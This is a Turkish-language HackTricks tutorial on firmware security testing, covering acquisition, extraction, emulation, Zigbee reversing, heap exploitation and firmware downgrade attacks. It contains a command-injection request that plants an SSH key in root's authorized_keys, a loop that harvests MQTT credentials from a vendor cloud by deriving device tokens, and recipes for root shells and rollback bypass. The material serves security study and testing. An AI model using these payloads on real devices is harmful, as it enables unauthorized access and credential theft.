# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Giriş**

### İlgili kaynaklar


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte depolanır; bu sayede cihaz, açıldığı andan itibaren gerekli talimatlara erişebilir ve işletim sisteminin başlatılmasını sağlar. Firmware'i incelemek ve olası olarak değiştirmek, güvenlik açıklarını tespit etmede kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreç aşağıdakilerle ilgili verilerin toplanmasını içerir:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader ayrıntıları
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı metrikleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve mevzuata uygunluk sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları paha biçilmezdir. Ayrıca mevcut open-source yazılım bileşenlerinin manuel ve otomatik inceleme süreçleriyle analiz edilmesi de önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz olanağı sunar.

## **Firmware'i Edinme**

Firmware edinme işlemi, her birinin kendine özgü karmaşıklık düzeyi olan çeşitli yöntemlerle gerçekleştirilebilir:

- Kaynaktan (**doğrudan**) (geliştiriciler, üreticiler)
- Sağlanan talimatlardan **derleyerek**
- Resmi destek sitelerinden **indirerek**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorgularından yararlanarak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage**'a doğrudan erişerek
- Man-in-the-middle teknikleriyle **güncellemeleri** intercept ederek
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkararak**
- Cihaz iletişimi içindeki güncelleme isteklerini **sniff ederek**
- **Hardcoded update endpoint**'lerini belirleyip kullanarak
- Bootloader veya ağ üzerinden **dump alarak**
- Diğer tüm yöntemler başarısız olduğunda, uygun donanım araçlarını kullanarak depolama çipini **çıkarıp okuyarak**

### Yalnızca UART logları: flash içindeki U-Boot env üzerinden root shell'i zorlamak

UART RX yok sayılıyorsa (yalnızca loglar alınıyorsa), **U-Boot environment blob**'ını offline olarak **düzenleyerek** yine de bir init shell'i zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SPI flash'ı bir SOIC-8 klipsi ve programlayıcıyla (3.3V) dump edin:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition'ını bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve blob için **U-Boot env CRC32** değerini yeniden hesaplayın.
3. Yalnızca env partition'ını yeniden flashlayıp yeniden başlatın; UART üzerinde bir shell görünmelidir.

Bu yöntem, bootloader shell'inin devre dışı olduğu ancak env partition'ına harici flash erişimi üzerinden yazılabildiği embedded cihazlarda kullanışlıdır.

## Firmware'i analiz etme

Artık **firmware'e sahip olduğunuza** göre, nasıl ele alacağınızı bilmek için firmware hakkında bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar vardır:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Bu araçlarla fazla bir şey bulamazsanız `binwalk -E <bin>` ile imajın **entropy** değerini kontrol edin; entropy düşükse şifrelenmiş olma ihtimali düşüktür. Entropy yüksekse büyük olasılıkla şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca **firmware içine gömülü dosyaları** çıkarmak için bu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ya da dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsiniz.

### Dosya Sistemini Alma

Önceki bölümde açıklanan `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk genellikle dosya sistemini **dosya sistemi türünün adını taşıyan bir klasörün** içine çıkarır. Bu türler genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuel Dosya Sistemi Çıkarma

Bazen binwalk, signature'ları içinde dosya sistemine ait **magic byte** değerini bulundurmaz. Bu durumlarda binwalk'ı kullanarak dosya sisteminin **offset** değerini bulun, sıkıştırılmış dosya sistemini binary'den **carve edin** ve aşağıdaki adımları kullanarak türüne göre dosya sistemini **manuel olarak çıkarın**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem'inde carving yapmak için aşağıdaki **dd command** komutunu çalıştırın.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak, aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar bundan sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash kullanan ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware Analizi

Firmware elde edildikten sonra, yapısını ve olası güvenlik açıklarını anlamak için parçalarına ayırmak önemlidir. Bu süreç, firmware image'ından değerli verileri analiz etmek ve çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

Binary dosyanın (şu şekilde belirtilir: `<bin>`) ilk incelemesi için bir dizi komut sağlanmıştır. Bu komutlar; dosya türlerini belirlemeye, string'leri çıkarmaya, binary verileri analiz etmeye ve partition ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
İmajın **şifreleme** durumunu değerlendirmek için `binwalk -E <bin>` ile **entropi** kontrol edilir. Düşük entropi, şifreleme olmadığını gösterirken yüksek entropi olası şifreleme veya sıkıştırmaya işaret eder.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** dokümantasyonu ve dosya inceleme amacıyla **binvis.io** gibi araç ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` kullanılarak genellikle dosya sistemi çıkarılabilir; bu işlem çoğunlukla dosya sistemi türünün adını taşıyan bir dizine yapılır (ör. squashfs, ubifs). Ancak **binwalk**, eksik magic bytes nedeniyle dosya sistemi türünü tanıyamadığında manuel çıkarma gerekir. Bu işlem, dosya sisteminin offset değerini bulmak için `binwalk` kullanmayı ve ardından dosya sistemini ayırmak için `dd` komutunu çalıştırmayı içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Sonrasında, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri manuel olarak çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranır. Güvenli olmayan network daemon'larına, hardcoded kimlik bilgilerine, API endpoint'lerine, update server işlevlerine, derlenmemiş kodlara, startup script'lerine ve offline analysis için derlenmiş binary'lere dikkat edilir.

**İncelenecek önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Olası güvenlik açıkları için yapılandırma ve script dosyaları
- Daha ileri analysis için embedded binary'ler
- Yaygın IoT cihazı web server'ları ve binary'leri

Dosya sistemi içindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya yardımcı olan çeşitli araçlar vardır:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analysis için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static ve dynamic analysis için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş Binary'lerde Güvenlik Kontrolleri

Dosya sisteminde bulunan hem source code hem de derlenmiş binary'ler güvenlik açıkları açısından dikkatle incelenmelidir. Unix binary'leri için **checksec.sh** ve Windows binary'leri için **PESecurity** gibi araçlar, exploit edilebilecek korumasız binary'leri belirlemeye yardımcı olur.

## Türetilmiş URL token'ları aracılığıyla cloud yapılandırmasını ve MQTT kimlik bilgilerini toplama

Birçok IoT hub'ı, cihaz başına yapılandırmasını şu biçimde görünen bir cloud endpoint'inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis sırasında, `<token>` değerinin hardcoded bir secret kullanılarak device ID'den yerel olarak türetildiğini görebilirsiniz. Örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve uppercase hex olarak temsil edilir

Bu tasarım, bir deviceId ve STATIC_KEY'i öğrenen herkesin URL'yi yeniden oluşturmasına ve cloud yapılandırmasını çekmesine olanak tanır; bu yapılandırma çoğu zaman plaintext MQTT kimlik bilgilerini ve topic prefix'lerini ortaya çıkarır.

Pratik iş akışı:

1) UART boot log'larından deviceId'yi çıkarın

- Bir 3.3V UART adapter'ı (TX/RX/GND) bağlayın ve log'ları yakalayın:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cloud config URL pattern'ini ve broker adresini yazdıran satırları arayın, örneğin:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'den STATIC_KEY ve token algoritmasını kurtarma

- İkili dosyaları Ghidra/radare2 içine yükleyin ve config path ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config ve MQTT credentials topla

- URL'yi oluştur ve curl ile JSON'u çek; secrets'ları çıkarmak için jq ile ayrıştır:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Plaintext MQTT ve zayıf topic ACL'lerini kötüye kullanma (varsa)

- Ele geçirilen kimlik bilgilerini kullanarak maintenance topic'lerine subscribe olun ve hassas olayları arayın:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Tahmin edilebilir cihaz kimliklerini enumerate edin (ölçekli olarak, yetkilendirmeyle)

- Birçok ekosistem, vendor OUI/ürün/tür byte'larını sıralı bir son ekle birleştirir.
- Aday kimlikleri yineleyebilir, token'lar türetebilir ve yapılandırmaları programatik olarak alabilirsiniz:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- Mass enumeration yapmaya çalışmadan önce her zaman açık yetki alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden secret'ları kurtarmak için emulation veya static analysis yöntemlerini tercih edin.


Firmware'i emulation ile çalıştırma süreci, bir cihazın çalışmasının veya tek bir programın **dynamic analysis** işlemini mümkün kılar. Bu yaklaşım, donanım veya architecture bağımlılıklarıyla ilgili zorluklarla karşılaşabilir; ancak root filesystem'ı veya belirli binary'leri, Raspberry Pi gibi matching architecture ve endianness özelliklerine sahip bir cihaza ya da önceden oluşturulmuş bir virtual machine'e aktararak further testing yapılabilir.

### Tekil Binary'leri Emulation ile Çalıştırma

Tek programları incelemek için programın endianness ve CPU architecture özelliklerini belirlemek kritik öneme sahiptir.

#### MIPS Architecture ile Örnek

Bir MIPS architecture binary'sini emulation ile çalıştırmak için şu command kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını kurmak için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian) için `qemu-mips` kullanılır; little-endian binary'ler içinse `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emülasyon amacıyla `qemu-arm` emulator'ı kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve diğer araçlar, full firmware emulation işlemini kolaylaştırır, süreci otomatikleştirir ve dynamic analysis'a yardımcı olur.

## Dynamic Analysis in Practice

Bu aşamada analiz için gerçek veya emüle edilmiş bir device environment kullanılır. OS ve filesystem'a shell access'i korumak önemlidir. Emülasyon hardware interactions'ı kusursuz şekilde taklit etmeyebilir; bu nedenle zaman zaman emülasyonu yeniden başlatmak gerekebilir. Analiz filesystem'ı yeniden incelemeli, exposed webpages ve network services'ları exploit etmeli ve bootloader vulnerabilities'larını araştırmalıdır. Firmware integrity tests, olası backdoor vulnerabilities'larını tespit etmek açısından kritiktir.

## Runtime Analysis Techniques

Runtime analysis, gdb-multiarch, Frida ve Ghidra gibi araçları kullanarak bir process veya binary ile kendi operating environment'ı içinde etkileşim kurmayı; breakpoint'ler ayarlamayı ve fuzzing ile diğer teknikler aracılığıyla vulnerabilities tespit etmeyi içerir.

Full debugger bulunmayan embedded target'lar için cihaza **statik olarak linklenmiş bir `gdbserver` kopyalayın** ve uzaktan attach edin:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hub’larında RF stack’i genellikle bir **radio MCU** ile Linux userland process’i arasında bölünür. Yararlı bir workflow, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havada **RF frame**
2. Radio MCU üzerindeki **controller-side parser**
3. Linux’a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon içindeki **application dispatcher**
5. **protocol-specific handler / state machine**

Bu mimari, tek yerine iki reversing hedefi oluşturur. Controller binary radio frame’leri `Group,Command,arg1,arg2,...` gibi bir textual protocol’e dönüştürüyorsa şunları kurtarın:

- **Message group**’ları ve dispatch table’ları
- Hangi mesajların **network** üzerinden, hangilerinin controller’ın kendisinden gelebileceği
- Tam **manufacturer-specific discriminator field**’ları (örneğin Zigbee `manufacturer_code` ve custom `cluster_command`)
- Hangi handler’ların yalnızca **commissioning**, discovery veya firmware/model download aşamalarında erişilebilir olduğu

Özellikle Zigbee için pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine güvenip güvenmediğini kontrol edin. Böyleyse commissioning trafiğini sniff etmek **Network Key** değerini açığa çıkarabilir. Zigbee 3.0 install code’ları bu exposure’ı azaltır; bu nedenle test edilen cihazın bunları gerçekten enforce edip etmediğini not edin.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL command’ları, standardized cluster’lara kıyasla genellikle daha iyi bir hedeftir; çünkü bunlar daha az battle-tested validation içeren **custom parsing code** ve internal **FSM**’lere aktarılır.<sup>[[8]](#references)</sup>

Pratik workflow:

- **Vendor-only handler**’ı bulana kadar command dispatcher’ı reverse edin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table’larını kurtarın.
- Otomatik olarak ilerleyen **transitional state**’leri ve sonunda attacker-controlled state’i resetleyen veya free eden retry/error branch’lerini belirleyin.
- Buggy handler’ın her zaman erişilebilir olduğunu varsaymak yerine, daemon’ı vulnerable state’e yerleştirmek için hangi meşru protocol exchange’lerinin gerekli olduğunu doğrulayın.

Timing-sensitive protocol’ler için Python framework’ünden yapılan packet replay çok yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoint**’leri, **attribute**’ları ve commissioning timing’ini açığa çıkarabilmek için vendor-grade stack kullanan gerçek hardware üzerinde (örneğin bir **nRF52840**) meşru bir cihazı emulate etmektir.

### Fragmented-download bug class in embedded daemons

Embedded daemon’larda tekrarlanan bir firmware bug class’ı **fragmented blob/model/configuration download** işlemlerinde görülür:<sup>[[8]](#references)</sup>

1. **First fragment** (`offset == 0`) `ctx->total_size` değerini kaydeder ve `malloc(total_size)` çağrısı yapar.
2. Sonraki fragment’ler yalnızca `packet_total_size >= offset + chunk_len` gibi attacker-controlled **packet-local** field’ları validate eder.
3. Copy işlemi, **original allocated size**’a karşı kontrol yapılmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` ile gerçekleştirilir.

Bu durum attacker’ın şunları göndermesine olanak tanır:

- Küçük bir heap allocation zorlamak için **small** declared total size içeren ilk geçerli fragment.
- **Expected offset** değerine, ancak daha büyük bir `chunk_len` değerine sahip sonraki fragment.
- Fresh check’leri karşılarken başlangıçta allocate edilmiş buffer’ı overflow eden forged packet-local size.

Vulnerable path commissioning logic’in arkasındaysa exploitation, malformed fragment’leri göndermeden önce hedefi beklenen model-download veya blob-download state’ine taşımak için yeterli **device emulation** içermelidir.

### Protocol-driven `free()` triggers

Embedded daemon’larda heap metadata exploitation’ı trigger etmenin en kolay yolu genellikle “cleanup’ı beklemek” değil, **protocol’ün kendi error handling mekanizmasını zorlamaktır**:<sup>[[8]](#references)</sup>

- FSM’i **retry** veya **error** state’lerine geçirmek için malformed follow-up fragment’ler gönderin.
- Retry threshold’u aşarak daemon’ın **context’i reset etmesini** ve bozulmuş buffer’ı free etmesini sağlayın.
- Process’in ilgisiz nedenlerle crash olmasından önce allocator-side primitive’lerini trigger etmek için bu öngörülebilir `free()` işlemini kullanın.

Bu teknik, embedded Linux’taki **musl/uClibc/dlmalloc-like** allocator’lara karşı özellikle yararlıdır; chunk metadata’yı bozmak, unlink/unbin logic’ini bir write primitive’e dönüştürebilir. Stabil bir pattern, gerçek bin pointer’larını hemen overwrite edip process’i crash ettirmek yerine, allocator traversal’ını overflow edilmiş buffer içinde hazırlanmış **fake chunk**’lara yönlendirmek için bir **size field**’ını bozmaktır.

## Binary Exploitation and Proof-of-Concept

Belirlenen vulnerability’ler için PoC geliştirmek, hedef architecture’ın ve lower-level language’lerde programming’in derinlemesine anlaşılmasını gerektirir. Embedded system’lerde binary runtime protection’lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekli olabilir.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc’ye benzer fastbin’ler kullanır. Daha sonraki büyük bir allocation `__malloc_consolidate()` işlemini trigger edebilir; bu nedenle herhangi bir fake chunk’ın check’lerden geçmesi gerekir (sane size, `fd = 0` ve çevredeki chunk’ların “in use” olarak görülmesi).<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ASLR etkin, ancak ana binary **non-PIE** ise in-binary `.data/.bss` address’leri sabittir. Fastbin allocation’ı bir **function pointer table** üzerine yerleştirmek için zaten geçerli bir heap chunk header’ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser-stopping NUL:** JSON parse edildiğinde payload içindeki bir `\x00`, parsing’i durdururken stack pivot/ROP chain için sondaki attacker-controlled byte’ları koruyabilir.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağrılarını yapan bir ROP chain, executable shellcode’u bilinen bir mapping içine yerleştirip ona jump edebilir.

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi operating system’ler, firmware security testing için gerekli tool’larla donatılmış, önceden yapılandırılmış environment’lar sağlar.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing işlemlerini gerçekleştirmenize yardımcı olmak için tasarlanmış bir distro’dur. Gerekli tüm tool’ların yüklü olduğu, önceden yapılandırılmış bir environment sağlayarak size büyük ölçüde zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing tool’ları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing operating system.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Bir vendor firmware image’ları için cryptographic signature check’leri uygulasa bile, **version rollback (downgrade) protection** sıklıkla atlanır. Boot veya recovery-loader, embedded public key ile yalnızca signature’ı doğruluyor ancak flash edilen image’ın *version* değerini (veya monotonic counter’ını) karşılaştırmıyorsa, attacker **geçerli bir signature taşıyan daha eski ve vulnerable firmware’i** meşru şekilde kurabilir ve böylece patch’lenmiş vulnerability’leri yeniden ortaya çıkarabilir.<sup>[[4]](#references)</sup>

Tipik attack workflow:

1. **Daha eski, signed image’ı elde edin**
* Vendor’ın public download portal’ından, CDN’inden veya support site’ından alın.
* Companion mobile/desktop application’lardan extract edin (ör. bir Android APK içindeki `assets/firmware/` altında).
* VirusTotal, Internet archive’ları, forumlar vb. third-party repository’lerden temin edin.
2. Image’ı herhangi bir exposed update channel üzerinden cihaza **upload edin veya serve edin**:
* Web UI, mobile-app API, USB, TFTP, MQTT vb.
* Birçok consumer IoT cihazı, Base64-encoded firmware blob’larını kabul eden, bunları server-side decode eden ve recovery/upgrade işlemini trigger eden *unauthenticated* HTTP(S) endpoint’leri expose eder.
3. Downgrade sonrasında newer release’te patch’lenmiş bir vulnerability’yi exploit edin (örneğin daha sonra eklenmiş bir command-injection filter’ı).
4. Persistence elde edildiğinde detection’dan kaçınmak için isteğe bağlı olarak latest image’ı yeniden flash edin veya update’leri disable edin.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Güvenlik açığı bulunan (downgrade edilmiş) firmware'de `md5` parametresi, herhangi bir sanitisation uygulanmadan doğrudan bir shell command içine birleştirilir; bu da rastgele command'lerin injection edilmesine olanak tanır (burada SSH key tabanlı root erişimini etkinleştirmek için). Daha sonraki firmware sürümleri temel bir karakter filtresi eklemiş olsa da downgrade korumasının bulunmaması, düzeltmeyi etkisiz kılar.<sup>[[4]](#references)</sup>

### Mobile Apps'ten Firmware Çıkarma

Birçok vendor, companion mobile application'larına tam firmware image'larını dahil eder; böylece app, device'ı Bluetooth/Wi-Fi üzerinden update edebilir. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi path'lerde şifrelenmemiş olarak saklanır. `apktool`, `ghidra` veya yalnızca `unzip` gibi tools, physical hardware'a dokunmadan signed image'ları çıkarmanıza olanak tanır.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot tasarımlarında yalnızca updater için anti-rollback bypass

Bazı vendor'lar anti-downgrade **ratchet** mekanizmasını uygular, ancak bunu yalnızca *updater* mantığı içinde kullanır (örneğin CAN üzerinden bir UDS routine, bir recovery command veya userspace OTA agent). Daha sonra **bootloader** yalnızca image signature/CRC kontrolü yapar ve partition table veya slot metadata bilgisine güvenirse rollback protection yine bypass edilebilir.<sup>[[7]](#references)</sup>

Tipik zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini persistent storage'da saklanan bir değerle karşılaştırır ve daha eski signed image'ları reddeder.
- Bootloader bu ratchet değerini **parse** etmez ve boot işlemi öncesinde yalnızca header, CRC ve signature doğrulaması yapar.
- Slot activation ayrı olarak bir partition table'da veya per-slot generation counter ile saklanır ve doğrulanmış exact firmware digest değeriyle **cryptographically bound** değildir.

Bu durum dual-slot sistemlerinde bir **validate-one-image / boot-another-image** primitive oluşturur. Saldırgan, updater'ın güncel signed image kullanarak slot B'yi bir sonraki boot target olarak işaretlemesini sağlayabiliyor ve reboot öncesinde slot B'yi overwrite edebiliyorsa, bootloader yalnızca daha önce commit edilmiş slot metadata'sına güvendiği için downgraded image'ı boot edebilir.

Yaygın abuse pattern:

1. **Current signed** firmware'i passive slot'a upload edin ve layout'un bu slotu bir sonraki active slot olarak işaretlemesi için normal validation/switch routine'ini çalıştırın.
2. **Henüz reboot etmeyin**. Aynı session içinde slot-preparation/erase routine'ine yeniden girin.
3. Updater'ın az önce promoted olan **aynı physical slot'u** silmesi için stale boot-state veya stale slot-selection logic'i abuse edin.
4. Bu slota **daha eski ancak hâlâ signed** olan firmware'i yazın.
5. Ratchet'i uygulayan validation routine'ini atlayın ve doğrudan reboot edin.
6. Bootloader promoted slot'u seçer, yalnızca signature/integrity doğrulaması yapar ve eski image'ı boot eder.

A/B update implementasyonlarını reverse ederken aranacak noktalar:

- Başarılı bir switch sonrasında yenilenmeyen **boot-time flags** üzerinden türetilen slot selection.
- **Current committed layout** yerine stale state'e göre bir slotu silen `prepare_passive_slot()` tarzı bir routine.
- Yalnızca **generation counter** / active flag değerini artıran ve validated image hash değerini saklamayan `part_write_layout()` tarzı bir function.
- Userspace veya updater code içinde uygulanan, ancak ROM / bootloader / secure boot stages içinde bulunmayan ratchet kontrolleri.
- Slot'un içeriği silinip yeniden yazıldıktan sonra bile slot'u bootable olarak işaretli bırakan erase veya recovery routines.

### Update Logic'i Değerlendirme Checklist'i

* *Update endpoint*'in transport/authentication mekanizması yeterince korunuyor mu (TLS + authentication)?
* Device flashing işleminden önce **version numbers** veya **monotonic anti-rollback counter** değerlerini karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (ör. signatures ROM code tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca signature/CRC kontrolü yapmak yerine updater ile **aynı ratchet'i uyguluyor mu**?
* Slot activation metadata'sı **validated firmware digest/version** ile **bound** mı, yoksa promotion sonrasında bir slot değiştirilebiliyor mu?
* Bir slot switch başarılı olduktan sonra device reboot etmeye zorlanıyor mu, yoksa sonraki update/erase routines aynı session içinde hâlâ erişilebilir mi?
* Userland code ek sanity checks gerçekleştiriyor mu (ör. allowed partition map, model number)?
* *Partial* veya *backup* update flows aynı validation logic'i yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback attacks karşısında savunmasızdır.

## Pratik yapmak için vulnerable firmware

Firmware'deki vulnerabilities keşfetme pratiği yapmak için aşağıdaki vulnerable firmware projects başlangıç noktası olarak kullanılabilir.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
